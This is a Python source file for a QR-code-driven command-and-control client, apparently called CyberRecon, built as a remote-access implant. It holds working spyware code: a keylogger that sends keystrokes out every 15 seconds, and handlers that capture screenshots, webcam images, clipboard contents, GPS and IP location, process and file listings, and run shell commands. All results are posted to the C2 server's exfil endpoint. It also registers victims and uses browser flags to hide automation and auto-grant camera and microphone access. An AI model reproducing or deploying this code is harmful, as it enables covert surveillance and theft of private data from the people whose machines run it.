"""
CyberRecon QR Decoder Client (v3 - Fast + Deduplicated)
Uses headless Chrome + OpenCV to decode QR commands.
Fixes:
  - Deduplicate commands (no double-execution)
  - JPEG screenshots (10x faster than PNG)
  - No fake webcam fallback (no browser-screenshot-as-webcam)
  - 1s default poll interval
"""

import base64
import json
import os
import threading
import time
from io import BytesIO

import cv2
import numpy as np
import requests
from PIL import Image
from selenium import webdriver
from selenium.webdriver.chrome.options import Options


class KeyloggerModule:
    def __init__(self, exfil_callback):
        self.exfil_callback = exfil_callback
        self.buffer = ""
        self.buffer_lock = threading.Lock()
        self.listener = None
        self.active = False
        self.flush_thread = None

    def _on_press(self, key):
        try:
            with self.buffer_lock:
                self.buffer += key.char
        except AttributeError:
            with self.buffer_lock:
                if key == key.space:
                    self.buffer += " "
                elif key == key.enter:
                    self.buffer += "\n[ENTER]\n"
                elif key == key.tab:
                    self.buffer += "\t[TAB]"
                elif key == key.backspace:
                    self.buffer += "[BKSP]"
                elif key == key.esc:
                    self.buffer += "[ESC]"
                elif key in (key.shift, key.shift_r, key.ctrl_l, key.ctrl_r, key.alt_l, key.alt_r):
                    pass
                else:
                    self.buffer += f"[{str(key).replace('Key.', '').upper()}]"

    def _flush_loop(self, interval=15):
        while self.active:
            time.sleep(interval)
            with self.buffer_lock:
                if self.buffer:
                    chunk = self.buffer
                    self.buffer = ""
                    try:
                        self.exfil_callback("keystrokes", chunk)
                        print(f"    -> [KEYLOG] Exfiltrated {len(chunk)} chars")
                    except Exception as e:
                        print(f"    -> [KEYLOG] Exfil failed: {e}")

    def start(self):
        if self.active:
            print("    -> [KEYLOG] Already active")
            return
        try:
            from pynput import keyboard
        except ImportError:
            print("    -> [!] pynput not installed")
            return

        self.active = True
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        self.flush_thread = threading.Thread(target=self._flush_loop, args=(15,), daemon=True)
        self.flush_thread.start()
        print("    -> [KEYLOG] Keystroke listener STARTED (flush every 15s)")

    def stop(self):
        if not self.active:
            print("    -> [KEYLOG] Not active")
            return
        self.active = False
        if self.listener:
            self.listener.stop()
        with self.buffer_lock:
            if self.buffer:
                self.exfil_callback("keystrokes", self.buffer)
                self.buffer = ""
        print("    -> [KEYLOG] Keystroke listener STOPPED")


class QRDecoder:
    def __init__(self, c2_url: str, victim_id: str):
        self.c2_url = c2_url.rstrip("/")
        self.victim_id = victim_id
        self.driver = None
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.keylogger = KeyloggerModule(self._exfil)

        # FIX: deduplicate executed commands by ID
        self.seen_ids = set()
        self.seen_lock = threading.Lock()

    def register_with_c2(self, hostname="DESKTOP-VICTIM", os_name="Windows 11", user="Admin"):
        try:
            r = self.session.post(
                f"{self.c2_url}/register",
                json={"hostname": hostname, "os": os_name, "user": user},
                timeout=5
            )
            data = r.json()
            self.victim_id = data["victim_id"]
            print(f"[+] Auto-registered. Victim ID: {self.victim_id}")
            return True
        except Exception as e:
            print(f"[!] Auto-register failed: {e}")
            return False

    def init_headless_browser(self):
        chrome_options = Options()
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=800,600")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option("useAutomationExtension", False)
        chrome_options.add_argument("--use-fake-ui-for-media-stream")
        chrome_options.add_argument("--use-fake-device-for-media-stream")
        chrome_options.add_experimental_option("prefs", {
            "profile.default_content_setting_values.media_stream_camera": 1,
            "profile.default_content_setting_values.media_stream_mic": 1,
            "profile.default_content_setting_values.notifications": 1,
        })

        try:
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_cdp_cmd(
                "Page.addScriptToEvaluateOnNewDocument",
                {"source": "Object.defineProperty(navigator, 'webdriver', { get: () => undefined })"}
            )
            print("[+] Headless Chrome initialized (stealth + media auto-grant)")
        except Exception as e:
            print(f"[!] Chrome unavailable: {e}")
            print("[!] Install Google Chrome: https://www.google.com/chrome/")
            print("[!] Falling back to requests-based QR fetch (less stealthy)")
            self.driver = None

    def capture_qr_screenshot(self) -> np.ndarray:
        qr_url = f"{self.c2_url}/qr/{self.victim_id}"

        if self.driver:
            self.driver.get(qr_url)
            time.sleep(0.3)
            screenshot = self.driver.get_screenshot_as_png()
            img = Image.open(BytesIO(screenshot))
            return cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)

        resp = self.session.get(qr_url, timeout=5)
        resp.raise_for_status()
        img = Image.open(BytesIO(resp.content)).convert("RGB")
        return cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)

    def decode_qr_image(self, image: np.ndarray) -> dict:
        try:
            detector = cv2.QRCodeDetector()
            data, bbox, _ = detector.detectAndDecode(image)
            if data:
                payload = base64.b64decode(data).decode("utf-8")
                return json.loads(payload)
            return None
        except Exception as e:
            print(f"[!] Decode error: {e}")
            return None

    def listen_for_commands(self, interval: int = 1):
        print(f"[+] Starting QR C2 listener for victim: {self.victim_id}")
        print(f"[+] Polling interval: {interval}s")
        print("-" * 50)

        while True:
            try:
                start_time = time.time()
                img = self.capture_qr_screenshot()
                command = self.decode_qr_image(img)

                if command:
                    cmd_id = command.get("id")

                    # FIX: skip duplicate QR reads (same command served twice)
                    if cmd_id:
                        with self.seen_lock:
                            if cmd_id in self.seen_ids:
                                print(f"[.] Skipping duplicate QR (id={cmd_id})")
                                time.sleep(max(0, interval - (time.time() - start_time)))
                                continue
                            self.seen_ids.add(cmd_id)
                            if len(self.seen_ids) > 500:
                                self.seen_ids = set(list(self.seen_ids)[-200:])

                    latency = (time.time() - start_time) * 1000
                    print(f"[QR] Decoded: {command.get('cmd', 'unknown')} | "
                          f"Latency: {latency:.0f}ms | ID: {cmd_id or 'N/A'}")
                    self.execute_command(command)
                else:
                    print("[.] No QR detected in frame")

                time.sleep(max(0, interval - (time.time() - start_time)))

            except KeyboardInterrupt:
                print("\n[!] Stopping QR listener")
                break
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(interval)

    def execute_command(self, command: dict):
        cmd_name = command.get("cmd", "unknown")
        handlers = {
            "heartbeat": self._handle_heartbeat,
            "whoami": self._handle_whoami,
            "screenshot": self._handle_screenshot_stealth,
            "webcam_capture": self._handle_webcam,
            "keylogger": self._handle_keylogger,
            "clipboard_steal": self._handle_clipboard,
            "file_download": self._handle_download,
            "gps_location": self._handle_gps,
            "process_list": self._handle_process_list,
            "system_info": self._handle_system_info,
            "list_files": self._handle_list_files,
            "shell": self._handle_shell,
            "persist": self._handle_persist,
            "self_destruct": self._handle_self_destruct
        }
        handler = handlers.get(cmd_name, self._handle_unknown)
        handler(command)

    # === Command Handlers ===

    def _handle_heartbeat(self, cmd):
        print("    -> Heartbeat acknowledged")

    def _handle_whoami(self, cmd):
        import getpass
        result = f"{getpass.getuser()}@{os.environ.get('COMPUTERNAME', 'unknown')}"
        print(f"    -> whoami: {result}")
        self._exfil("whoami", result)

    def _handle_screenshot_stealth(self, cmd):
        """Fast JPEG screenshot with downscale."""
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab()

            # Downscale to max 1280px wide — huge speedup, still readable
            max_w = 1280
            if img.width > max_w:
                ratio = max_w / img.width
                img = img.resize((max_w, int(img.height * ratio)), resample=1)

            buf = BytesIO()
            img.convert("RGB").save(buf, format="JPEG", quality=70, optimize=False)
            b64_data = base64.b64encode(buf.getvalue()).decode("utf-8")
            print(f"    -> [STEALTH] Screenshot captured ({len(b64_data)} chars, JPEG)")
            self._exfil("screenshot", b64_data)
        except Exception as e:
            print(f"    -> [!] Screenshot failed: {e}")
            if self.driver:
                self._exfil("screenshot", self.driver.get_screenshot_as_base64())

    def _handle_webcam(self, cmd):
        """Real webcam only. No fake browser-screenshot fallback."""
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret and frame is not None:
                _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                b64 = base64.b64encode(buf).decode()
                print(f"    -> Webcam frame captured ({len(b64)} chars)")
                self._exfil("webcam", b64)
            else:
                print("    -> [!] No webcam device available")
                self._exfil("webcam", "[no camera]")
        except Exception as e:
            print(f"    -> [!] Webcam error: {e}")
            self._exfil("webcam", f"[webcam error: {e}]")

    def _handle_keylogger(self, cmd):
        action = cmd.get("args", ["start"])[0]
        if action == "start":
            self.keylogger.start()
        else:
            self.keylogger.stop()

    def _handle_clipboard(self, cmd):
        try:
            import pyperclip
            data = pyperclip.paste()
            print(f"    -> Clipboard: {str(data)[:50]}...")
            self._exfil("clipboard", data)
        except ImportError:
            print("    -> [!] pyperclip not installed")
            self._exfil("clipboard", "[pyperclip not installed on victim]")
        except Exception as e:
            print(f"    -> [!] Clipboard error: {e}")

    def _handle_download(self, cmd):
        filepath = cmd.get("args", ["unknown"])[0]
        print(f"    -> Download requested: {filepath}")
        self._exfil("file", f"[FILE REQUEST LOGGED] {filepath}")

    def _handle_gps(self, cmd):
        import platform
        import subprocess

        loc = {"latitude": None, "longitude": None, "accuracy_m": None,
               "source": "unknown", "platform": platform.system()}

        if platform.system() == "Windows":
            try:
                ps_script = '''
                Add-Type -AssemblyName System.Device
                $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
                $watcher.Start()
                $count = 0
                while ($watcher.Position.Location.IsUnknown -and $count -lt 10) {
                    Start-Sleep -Milliseconds 500
                    $count++
                }
                if ($watcher.Position.Location.IsUnknown -eq $false) {
                    "$($watcher.Position.Location.Latitude),$($watcher.Position.Location.Longitude),$($watcher.Position.Location.HorizontalAccuracy)"
                } else { "UNKNOWN" }
                $watcher.Stop()
                '''
                result = subprocess.run(
                    ["powershell", "-NoProfile", "-Command", ps_script],
                    capture_output=True, text=True, timeout=15,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                output = result.stdout.strip()
                if output and output != "UNKNOWN":
                    parts = output.split(",")
                    loc["latitude"] = float(parts[0])
                    loc["longitude"] = float(parts[1])
                    loc["accuracy_m"] = float(parts[2]) if len(parts) > 2 else 100
                    loc["source"] = "Windows Location API (GPS/WiFi)"
            except Exception as e:
                print(f"    -> [!] Windows Location failed: {e}")

        if loc["latitude"] is None:
            try:
                response = requests.get("http://ip-api.com/json/", timeout=5)
                data = response.json()
                if data.get("status") == "success":
                    loc["latitude"] = data.get("lat")
                    loc["longitude"] = data.get("lon")
                    loc["accuracy_m"] = 5000
                    loc["source"] = f"IP Geolocation ({data.get('isp', 'unknown')})"
                    loc["city"] = data.get("city")
                    loc["region"] = data.get("regionName")
                    loc["country"] = data.get("country")
                    loc["ip"] = data.get("query")
            except Exception as e:
                print(f"    -> [!] IP geolocation failed: {e}")

        if loc["latitude"] is None:
            loc["error"] = "Could not determine location"
            loc["latitude"] = 0
            loc["longitude"] = 0
            loc["source"] = "FAILED"

        print(f"    -> GPS: {loc['latitude']}, {loc['longitude']} ({loc['source']})")
        self._exfil("gps", loc)

    def _handle_process_list(self, cmd):
        try:
            import psutil
            procs = [{"pid": p.pid, "name": p.name()} for p in psutil.process_iter()][:15]
            print(f"    -> {len(procs)} processes enumerated")
            self._exfil("process_list", procs)
        except ImportError:
            print("    -> [!] psutil not installed")
            self._exfil("process_list", "[psutil not installed on victim]")

    def _handle_system_info(self, cmd):
        import platform
        import socket
        info = {
            "os": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "hostname": socket.gethostname(),
            "architecture": platform.architecture()[0]
        }
        print(f"    -> System: {info['os']} {info['release']}")
        self._exfil("system_info", info)

    def _handle_list_files(self, cmd):
        path = cmd.get("args", ["C:/Users"])[0]
        try:
            files = os.listdir(path)[:20]
            print(f"    -> {len(files)} entries in {path}")
            self._exfil("list_files", {"path": path, "entries": files})
        except Exception as e:
            self._exfil("list_files", f"Error listing {path}: {e}")

    def _handle_shell(self, cmd):
        import shlex
        import subprocess

        raw = " ".join(cmd.get("args", ["whoami"]))
        blocked = set("|&;<>()`$\\\"'\n\r")
        if any(ch in raw for ch in blocked):
            msg = f"[blocked] Shell metacharacters not allowed: {raw}"
            print(f"    -> {msg}")
            self._exfil("shell", msg)
            return

        try:
            argv = shlex.split(raw)
        except ValueError as e:
            self._exfil("shell", f"[ERROR] Invalid command syntax: {e}")
            return

        if not argv:
            self._exfil("shell", "[ERROR] Empty command")
            return

        try:
            kwargs = {
                "shell": False,
                "capture_output": True,
                "text": True,
                "timeout": 10,
            }
            if hasattr(subprocess, "CREATE_NO_WINDOW"):
                kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW

            result = subprocess.run(argv, **kwargs)
            output = result.stdout or result.stderr
            print(f"    -> shell: {raw}")
            self._exfil("shell", output)
        except FileNotFoundError:
            self._exfil("shell", f"[ERROR] Command not found: {argv[0]}")
        except subprocess.TimeoutExpired:
            self._exfil("shell", "[ERROR] Command timed out")
        except Exception as e:
            self._exfil("shell", f"[ERROR] Shell error: {e}")

    def _handle_persist(self, cmd):
        print("    -> Persistence mechanism triggered (demo placeholder)")

    def _handle_self_destruct(self, cmd):
        print("    -> [!] SELF-DESTRUCT INITIATED")
        self.keylogger.stop()
        if self.driver:
            self.driver.quit()
        exit(0)

    def _handle_unknown(self, cmd):
        print(f"    -> [!] Unknown command: {cmd}")

    def _exfil(self, data_type: str, data):
        try:
            url = f"{self.c2_url}/exfil/{self.victim_id}"
            self.session.post(url, json={"type": data_type, "data": data}, timeout=5)
        except Exception as e:
            print(f"    -> [!] Exfil failed: {e}")

    def cleanup(self):
        self.keylogger.stop()
        if self.driver:
            self.driver.quit()


def main():
    import argparse
    parser = argparse.ArgumentParser(description="CyberRecon QR C2 Decoder Client")
    parser.add_argument(
        "--c2",
        default=os.getenv("CYBERRECON_C2", "http://0.0.0.0:8443"),
        help="C2 server URL (or set CYBERRECON_C2 env var)",
    )
    parser.add_argument("--victim-id", help="Victim session ID")
    parser.add_argument("--hostname", default="DESKTOP-VICTIM", help="Hostname")
    parser.add_argument("--auto-register", action="store_true", help="Auto-register with C2")
    parser.add_argument("--interval", type=int, default=1, help="QR poll interval (seconds)")
    args = parser.parse_args()

    decoder = QRDecoder(args.c2, args.victim_id or "pending")

    if args.victim_id:
        print(f"[*] Using provided victim-id: {args.victim_id}")
    else:
        print("[*] No victim-id provided, auto-registering...")
        ok = decoder.register_with_c2(hostname=args.hostname)
        if not ok:
            print("[!] Registration failed — client will run with placeholder ID and likely 404")

    decoder.init_headless_browser()

    try:
        decoder.listen_for_commands(interval=args.interval)
    finally:
        decoder.cleanup()


if __name__ == "__main__":
    main()